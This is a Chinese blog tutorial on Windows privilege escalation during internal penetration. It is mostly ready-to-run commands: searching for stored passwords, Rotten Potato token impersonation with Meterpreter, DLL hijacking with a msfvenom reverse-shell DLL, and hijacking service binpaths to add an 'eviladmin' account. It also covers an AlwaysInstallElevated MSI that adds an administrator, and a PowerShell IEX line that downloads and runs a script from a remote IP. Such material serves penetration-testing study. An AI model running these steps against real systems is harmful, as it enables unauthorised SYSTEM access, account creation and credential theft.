<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="https://cjb12.github.io/project/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/project/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/project/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/project/css/style.css">

  
    
<link rel="stylesheet" href="/project/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/project/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/project/">Home</a>
        
          <a class="main-nav-link" href="/project/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/project/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://cjb12.github.io/project"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-内网渗透之权限提升（Windows篇）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/project/2023/04/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%88Windows%E7%AF%87%EF%BC%89/" class="article-date">
  <time class="dt-published" datetime="2023-04-16T01:53:14.000Z" itemprop="datePublished">2023-04-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/project/2023/04/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%88Windows%E7%AF%87%EF%BC%89/">内网渗透之权限提升（Windows篇）</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Windows四种权限：User、Administrator、System、TrustedInstaller，从左到右依次升高</p>
<p>纵向提权：低权限用户获得高权限角色的权限。</p>
<p>横向提权：获得同级别角色的权限。</p>
<p>内核溢出漏洞提权、错误的系统配置提权、数据库提权</p>
<h2 id="利用敏感信息提权"><a href="#利用敏感信息提权" class="headerlink" title="利用敏感信息提权"></a>利用敏感信息提权</h2><p>自动安装允许程序在不需要管理员关注下自动安装。这种解决方案用于在拥有较多雇员和时间紧缺的较大 型组织中部署程序。如果管理员没有进行清理的话，那么会有一个名为Unattend的XML文件残存在系统上。 这个XML文件包含所有在安装程序过程中的配置，包括一些本地用户的配置，以及管理员账户。</p>
<p>全盘搜索Unattend文件是个好办法，它通常会在以下一个文件夹中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Panther\ </span><br><span class="line">C:\Windows\Panther\Unattend\ </span><br><span class="line">C:\Windows\System32\ </span><br><span class="line">C:\Windows\System32\sysprep\</span><br></pre></td></tr></table></figure>

<p>除了Unattend.xml文件外，还要留意系统中的sysprep.xml和sysprep.inf文件，这些文件中都会包含部署操作 系统时使用的凭据信息，这些信息可以帮助我们提权。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\user\Desktop&gt; dir C:*vnc.ini /s /b /c</span><br><span class="line"></span><br><span class="line">#Get-ChildItem : 找不到接受实际参数“/b”的位置形式</span><br></pre></td></tr></table></figure>

<p>或者在名称中包含关键词的项目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\user\Desktop&gt; dir C:\ /s /b /c | findstr /sr password</span><br><span class="line"></span><br><span class="line">#Get-ChildItem : 找不到接受实际参数“/b”的位置形式</span><br></pre></td></tr></table></figure>

<p>或者可以在文件内容中搜索password之类的关键字：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\user\Desktop&gt;findstr /si password *.txt | *.xml | *.ini</span><br></pre></td></tr></table></figure>

<p>可以查询注册表，例如，字符串password：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM /f password /t REG_SZ /s</span><br><span class="line">reg query HKCU /f password /t REG_SZ /s</span><br></pre></td></tr></table></figure>

<p>在这些文件中通常包含用户名和密码，密码使用base64编码，并且在最后会附加”Password”，所以真正的密码需要去掉最后的”Password”。</p>
<h2 id="利用脚本自动查找系统潜在漏洞"><a href="#利用脚本自动查找系统潜在漏洞" class="headerlink" title="利用脚本自动查找系统潜在漏洞"></a>利用脚本自动查找系统潜在漏洞</h2><p><strong>Windows Exploit Suggester</strong></p>
<p>该工具可以将系统中已经安装的补丁程序与微软的漏洞数据库进行比较，并可以识别可能导致权限提升的漏洞，而且其只需要我们给出目标系统的信息即可。</p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a></p>
<p>使用如下：</p>
<p>首先更新漏洞数据库，会生成一个xls的文件，如下 2020-08-20-mssb.xls</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 windows-exploit-suggester.py --update</span><br></pre></td></tr></table></figure>

<p>然后执行如下命令，查看目标主机系统信息，保存为sysinfo.txt文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo &gt; sysinfo.txt</span><br></pre></td></tr></table></figure>

<p>最后，运行如下命令，查看该系统是否存在可利用的提权漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 windows-exploit-suggester.py -d 2023-04-12-mssb.xls -i sysinfo.txt</span><br></pre></td></tr></table></figure>

<p><strong>Sherlock脚本</strong></p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p>
<p>该脚本可以快速的查找出可能用于本地权限提升的漏洞。使用如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -c IEX(New-Object Net.WebClient).DownloadString(&#x27;http://39.xxx.xxx.210/Sherlock.ps1&#x27;);      // 远程执行</span><br><span class="line">Import-Module 目录\Sherlock.ps1        本地执行</span><br><span class="line"></span><br><span class="line">Find-AllVulns    // 调用脚本后，执行搜索命令</span><br></pre></td></tr></table></figure>

<p><strong>local_exploit_suggester 模块</strong></p>
<p>Metasploit内置模块提供了各种可用于提权的local exploits，并会基于架构，平台（即运行的操作系统），会话类型和所需默认选项提供建议。这极大的节省了我们的时间，省去了我们手动搜索local exploits的麻烦。</p>
<p>使用如下，假设我们已经获得了目标主机的一个session：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/recon/local_exploit_suggester </span><br><span class="line">set session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><strong>enum_patches 模块</strong></p>
<p>使用metasploit中的post&#x2F;windows&#x2F;gather&#x2F;enum_patches模块可以根据漏洞编号快速找出系统中缺少的补丁。使用如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use post/windows/gather/enum_patches</span><br><span class="line">set session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>在实际的查找潜在漏洞的过程中，建议手动和自动双管齐下。</p>
<p><strong>选择漏洞并利用：</strong></p>
<p>漏洞利用程序可以从以下几个地址中下载：（里面附有使用说明）</p>
<ul>
<li>Windows 下的提权大合集：<a target="_blank" rel="noopener" href="https://github.com/lyshark/Windows-exploits">https://github.com/lyshark/Windows-exploits</a></li>
<li>Windows内核溢出漏洞提权大全：<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></li>
<li>各大平台提权工具：<a target="_blank" rel="noopener" href="https://github.com/klsfct/getshell">https://github.com/klsfct/getshell</a></li>
</ul>
<h2 id="烂土豆配合MSF令牌窃取提权"><a href="#烂土豆配合MSF令牌窃取提权" class="headerlink" title="烂土豆配合MSF令牌窃取提权"></a>烂土豆配合MSF令牌窃取提权</h2><p>简介：烂土豆(Rotten Potato) MS16-075 提权是一个本地提权，只针对本地用户，不支持域用户</p>
<p>适用版本：Windows 7、8、10、2008、2012</p>
<p><strong>提权原理：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、欺骗 “NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。</span><br><span class="line">2、对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。</span><br><span class="line">3、模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。</span><br></pre></td></tr></table></figure>

<p><strong>操作方法：</strong></p>
<p>查看是否具有Selmpersonate权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getprivs</span><br><span class="line"></span><br><span class="line">##或者服务器的cmd下键入以下命令</span><br><span class="line">whoami /all</span><br><span class="line">whoami /priv</span><br></pre></td></tr></table></figure>

<p>如下，SeImpersonatePrivilege是土豆提权的必要条件</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021723175.png" alt="image-20231002172303135"></p>
<p>首先通过msf生成一个msf的木马，通过webshell传上去，然后执行，获取到会话，此时我们使用令牌窃取，会失败，因为此时我们只有web权限，权限太低，无法实现窃取SYSTEM权限，这个时候就需要用到烂土豆配合msf实现权限提升。我们利用webshell把下载好的烂土豆程序传到C盘根目录下，然后执行它，此时我们再通过msf的会话，使用令牌窃取功能即可成功实现从web权限到SYSTEM权限的提升。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">upload /root/potato.exe C:\Users\Public</span><br><span class="line">cd C:\\Users\\Public</span><br><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">execute -cH -f ./potato.exe</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</span><br></pre></td></tr></table></figure>

<p>烂土豆下载地址：<a target="_blank" rel="noopener" href="https://github.com/foxglovesec/Potato">https://github.com/foxglovesec/Potato</a></p>
<h2 id="Dll劫持提权"><a href="#Dll劫持提权" class="headerlink" title="Dll劫持提权"></a>Dll劫持提权</h2><p>适用版本：<strong>Windows 7、8、10、2008、2012</strong></p>
<p>程序运行一般会加载系统dll或本身程序自带的dll，如果我们将程序执行时需要加载的dll文件替换成木马程序，那么我们下次在启动程序时所加载的dll就是我们替换的那个木马程序了。</p>
<p>攻击过程：收集进程加载的dll-制作dll木马并上传-替换dll-启动应用后成功</p>
<p>收集该软件进程加载的dll 这一步在自己本机上测试，启动应用使用火绒剑分析其模块调用的dll，一般来说我们劫持该应用本身的dll，而不是系统dll，因为系统文件一般我们是更改不了的，所以一般选择未知文件和数字签名文件的dll来进行替换成msf生成的dll</p>
<p>msf生成dll木马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.8.134  lport=6677 -f dll &gt;./payload.dll</span><br></pre></td></tr></table></figure>

<p>然后进行dll替换即可，当管理员运行该程序时即可触发木马，msf即可收到会话。</p>
<h2 id="Windows服务带有易受攻击的权限一"><a href="#Windows服务带有易受攻击的权限一" class="headerlink" title="Windows服务带有易受攻击的权限一"></a>Windows服务带有易受攻击的权限一</h2><p>漏洞原理：由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以通过编辑ImagePath的值，更改该服务的可执行文件路径，使其指向恶意的可执行文件，从而实现权限提升。</p>
<p>该漏洞可以通过使用微软自带的检测工具SubInACL进行检测：<a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/download/details.aspx?id=23510">https://www.microsoft.com/en-us/download/details.aspx?id=23510</a></p>
<p>首先将SubInACL上传到目标机器，然后对相应服务的注册表项进行检测</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021723812.png" alt="image-20231002172327722"></p>
<p>如上图所示，“Everyone”在这个注册表项上有完全的控制权。意味着我们可以通过编辑ImagePath的值，更改该服务的可执行文件路径，使其指向恶意的可执行文件。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021723980.png" alt="image-20231002172342918"></p>
<p>在下一次启动该服务时，payload.exe将会以SYSTEM权限运行，我们可以通过直接对目标主机执行<code>“shutdown -r -t 0”</code>命令，使其主机重启即可，在此之前我们需要先在kali上启用一个监听，用于接收反弹shell的会话。</p>
<h2 id="Windows服务带有易受攻击的权限二"><a href="#Windows服务带有易受攻击的权限二" class="headerlink" title="Windows服务带有易受攻击的权限二"></a>Windows服务带有易受攻击的权限二</h2><p>漏洞原理：由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以通过编辑BINARY_PATH_NAME参数的值，如果我们将这个值修改成任何命令，那意味着这个命令在该服务下一次启动时，将会以SYSTEM权限运行。如果我们愿意，我们可以添加一个本地管理员，从而实现权限提升。</p>
<p>该漏洞可以通过使用微软自带的检测工具进行检测：</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -uwcqv &quot;username&quot; *          //检测当前用户或者用户组是否有可以修改的服务，根据实际情况修改username</span><br></pre></td></tr></table></figure>

<p>当我们执行以上命令时发现如下图所示的情况，说明此时该提权方法不可行</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021723131.png" alt="image-20231002172357091"> </p>
<p>如果我们对某服务的属性拥有完全控制权。那么我们通过编辑BINARY_PATH_NAME参数的值，将这个值修改成任何命令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sc config &quot;ServiceName&quot; binpath=&quot;net user eviladmin  P4ssword0 /add&quot;   //添加一个用户 </span><br><span class="line">//在修改了binpath的值后，用“sc stop”和“sc start”命令重启服务：</span><br><span class="line">sc stop &quot;ServiceName&quot;                           //关闭服务</span><br><span class="line">sc start &quot;ServiceName&quot;                           //启动服务</span><br></pre></td></tr></table></figure>

<p>然后我们以同样的方式，再将刚才添加的用户，添加到本地管理员组即可。同样，我们也可以将一个反弹shell载荷上传到目标机器中，并将binpath的值改成载荷的路径。</p>
<p>MSF有现成的漏洞利用模块：exploit&#x2F;windows&#x2F;local&#x2F;service_permissions</p>
<h2 id="Trusted-Service-Paths-提权漏洞"><a href="#Trusted-Service-Paths-提权漏洞" class="headerlink" title="Trusted Service Paths 提权漏洞"></a>Trusted Service Paths 提权漏洞</h2><p>漏洞原理：如果一个服务的可执行文件的路径没有被双引号引起来并且包含空格，那么这个服务就是有漏洞的，该漏洞利用了windows文件路径解析的特性并涉及服务路径的文件&#x2F;文件夹权限配置。</p>
<p><strong>windows文件路径解析的特性：</strong></p>
<p>当Windows服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021724137.png" alt="image-20231002172410084"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">路径没有包含在引号中，服务会按照以下顺序依次执行</span><br><span class="line">c:\program.exe</span><br><span class="line">c:\program files.exe</span><br><span class="line">c:\program files (x86)\grasssoft\macro.exe</span><br><span class="line">c:\program files (x86)\grasssoft\macro expert\MacroService.exe</span><br></pre></td></tr></table></figure>

<p>假如存在漏洞路径，我们可以将msf木马放到上面的c:\program.exe、c:\program files.exe、c:\program files (x86)\grasssoft\macro.exe路径下，然后重启机器，此时，反弹回来的shell，就是一个system权限的shell（windows服务通常以System权限运行，所以提供在解析服务所对应的文件路径中的空格时也是以系统权限运行的）。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用以下命令查看系统中错误配置的路径</span><br><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>确认目标机器中存在此漏洞后，把要上传的程序重命名并放置在存在此漏洞且可写的目录下，执行如下命令，尝试重启服务。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc stop &lt;service_name&gt;</span><br><span class="line">sc start &lt;service_name&gt;</span><br></pre></td></tr></table></figure>

<p>既然要重启服务，那么我们就可以知道，该提权方法需要管理员权限，重启服务的方法适用于从管理员权限到system的权限提升过程。而实际情况下，我们直接对目标主机执行<code>“shutdown -r -t 0”</code>命令让他重启就行了。</p>
<p>该提权方法在metasploit中对应的模块为：<code>exploit/windows/local/unquoted_service_path</code>，使用如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/unquoted_service_path</span><br><span class="line">set session 1</span><br><span class="line">set AutoRunScript migrate -f</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>注意：新反弹得到的meterpreter会很快就中断了，这是因为当一个进程在Windows中启动后，必须与服务控制管理进行通信，如果没有通信，服务控制管理器会认为出现了错误，进而终止这个进程。所以，我们要在终止载荷进程之前将它迁移到其他进程中，使用msf的“set AutoRunScript migrate -f”命令即可实现自动迁移进程。</p>
<h2 id="AlwaysInstallElevated提权漏洞"><a href="#AlwaysInstallElevated提权漏洞" class="headerlink" title="AlwaysInstallElevated提权漏洞"></a>AlwaysInstallElevated提权漏洞</h2><p>漏洞原理：用户开启了windows installer特权安装功能。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer]</span><br><span class="line">“AlwaysInstallElevated”=dword:00000001 </span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer]</span><br><span class="line">“AlwaysInstallElevated”=dword:00000001</span><br></pre></td></tr></table></figure>

<p>那么所有msi（windows应用安装程序）都会以SYSTEM权限运行。此时如果我们执行一个恶意msi程序，即可达到提权目的</p>
<p>同时需要注意的一点是，这个注册表项不一定总是存在的。（比如我的实验机</p>
<p>我们可以通过reg query来验证这两条注册表项的情况</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br></pre></td></tr></table></figure>

<p>如果均为1，我们就可以通过msfvenom生成恶意msi来提权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o rotten.msi</span><br></pre></td></tr></table></figure>

<p>然后执行这个msi，获得一个管理员账户。</p>
<p>如果两条注册表项的情况不是均为1，可以尝试激活AlwaysInstallElevated，激活它可以通过修改注册表的键值或者在图形化页面上激活。</p>
<p>图形化下激活它的路径为<code>计算机设置\管理模版\windows组件\windows installer</code>，选中已启用即可，该操作需要管理员权限。</p>
<p>通过修改注册表激活它的命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1</span><br><span class="line">reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1</span><br></pre></td></tr></table></figure>

<p>修改注册表的这两项需要有下面两权限：</p>
<ul>
<li>SeRestorePrivilege</li>
<li>SeTakeOwnershipPrivilege</li>
</ul>
<p>使用whoami &#x2F;priv可以查看当前用户的权限。</p>
<h3 id="MSI-Wrapper工具下的利用"><a href="#MSI-Wrapper工具下的利用" class="headerlink" title="MSI Wrapper工具下的利用"></a>MSI Wrapper工具下的利用</h3><p>下载地址：<a target="_blank" rel="noopener" href="https://www.exemsi.com/download/">https://www.exemsi.com/download/</a></p>
<p>MSI Wrapper是一个强大的MSI安装包的生产工具。它有一个友好的图形用户界面，操作简单直观，各种功能齐全，不需要任何知识的脚本可以产生满足要求的Windows安装程序安装程序。</p>
<p>（1）将Payload设置为执行shell.exe(一个msf马)：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021724668.png" alt="image-20231002172445595"></p>
<p>（2）设置为运行时要求提升权限：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021724842.png" alt="image-20231002172456771"></p>
<p>Application Id随便选：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021725610.png" alt="image-20231002172509514"></p>
<p>其他配置按照默认设置即可，最后在你设置的output目录中生成了shell.msi</p>
<p>将生成的shell.msi上传到目标主机中，并开启一个新的msf监听，然后在shell中执行开shell.msi文件:</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021725594.png" alt="image-20231002172521447"></p>
<p>如上图，成功获得system权限。</p>
<p>对于该漏洞，通常情况下，先对注册表项进行判断，如果满足条件(存在两个注册表项)，就可以利用AlwaysInstallElevated提权了</p>
<h2 id="AccessChk使用"><a href="#AccessChk使用" class="headerlink" title="AccessChk使用"></a>AccessChk使用</h2><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</a></p>
<p>可以看出accesschk称得上是查找有权限配置缺陷文件夹的必备工具，下面是accesschk的一些其他使用实例。</p>
<p>当第一次执行任何sysinternals工具包里的工具时，当前用户将会看到一个最终用户许可协议弹框，这是一个大问题，然而我们可以添加一个额外的参数“&#x2F;accepteula”去自动接受许可协议，即：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe /accepteula</span><br></pre></td></tr></table></figure>

<p>Accesschk可以自动的检查当我们使用一个特定的用户时，我们是否对Windows的某个服务有写的权限。当我们作为一个低权限用户，我们首先就想要看一下“Authenticated Users”组对这些服务的权限。</p>
<p>找出某个驱动器下所有权限配置有缺陷的文件夹路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -uwdqs Users c:\</span><br><span class="line">accesschk.exe -uwdqs &quot;Authenticated Users&quot; c:\</span><br></pre></td></tr></table></figure>

<p>找出某个驱动器下所有权限配置有缺陷的文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -uwqs Users c:\*.*</span><br><span class="line">accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\*.*</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021725234.png" alt="image-20231002172552184"></p>
<p>如上图可以看到对这个目录下的每一个文件它都列出了Authenticated Users用户组的权限，R为读权限，W为写权限，RW表示有读写权限，如果前面为空则表示没有权限。</p>
<p>根据前面这几个提权的思路，当我们检查文件或文件夹权限的时候，需要考虑哪些点事易受攻击的点。</p>
<p>你需要花费时间来检查所有的启动路径，Windows服务，计划任务和Windows启动项等</p>
<h2 id="Windows组策略首选项提权"><a href="#Windows组策略首选项提权" class="headerlink" title="Windows组策略首选项提权"></a>Windows组策略首选项提权</h2><p>SYSVOL是活动目录里面的一个用于<strong>存储公共文件服务器副本</strong>的共享文件夹，在域中的所有域控制器之间进行复制。SYSVOL文件夹是在安装活动目录时自动创建的，主要用来存<strong>放登录脚本、组策略数据及其他域控制器需要的域信息</strong>等。SYSVOL在所有经过身份验证的域用户或者域信任用户范围内共享，都可以读取。整个SYSVOL目录在所有的域控制器中是自动同步共享的，所有的域策略均存放在C:\Windows\SYSVOL\DOMAIN\Policies\ 目录中。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021726263.png" alt="image-20231002172650199"></p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021727516.png" alt="image-20231002172702461"></p>
<p>在一般的域环境中，所有机器都是脚本化批量部署的，数据量通常很大。为了方便地对所有的机器进行操作，<strong>网络管理员往往会使用域策略进行统一的配置和管理</strong>。大多数组织在创建域环境后，会要求加入域的计算机使用域用户密码进行登录验证。为了保证本地管理员密码的安全性，这些组织的网络管理员往往会利用组策略去批量修改本地管理员密码。<strong>但是这样就会出现一个问题，所有机器的本地管理员密码是相同的。攻击者获得了一台机器的本地管理员密码，就相当于获得了整个域中所有机器的本地管理员密码，黑客就可以获取他们所有机器的管理权限。</strong></p>
<p><strong>管理员在域中新建一个组策略批量修改域中机器的本地管理员密码后，操作系统会自动在SYSVOL共享目录中生成一个XML文件，该文件中保存了该组策略更新后的密码。</strong>该密码使用AES-256加密算法，安全性还是比较高的。但是，2012年微软在官方网站上公布了该密码的私钥，导致保存在XML文件中的密码的安全性大大降低。由于任何域用户和域信任的用户均可对该共享目录进行访问，这就意味着，任何用户都可以访问保存在XML文件中的密码并将其解密，从而控制域中所有使用该账号、密码的本地管理员计算机</p>
<p>我们可以在SYSVOL中搜索包含cpassword获取组策略的凭据。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021728676.png" alt="image-20231002172821624"></p>
<p>如上图可以看到其中的cpassword项，保存的是加密后的内容，加密方式为AES 256，虽然目前AES 256很难被攻破，但是微软选择公开了该AES 256加密的私钥，地址如下：</p>
<p><a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/cc422924.aspx">https://msdn.microsoft.com/en-us/library/cc422924.aspx</a></p>
<p>借助该私钥，我们就能还原出明文</p>
<h3 id="PowerShell下的利用"><a href="#PowerShell下的利用" class="headerlink" title="PowerShell下的利用"></a>PowerShell下的利用</h3><p>即PowerSploit中的Get-GPPPassword.ps1脚本</p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1</a></p>
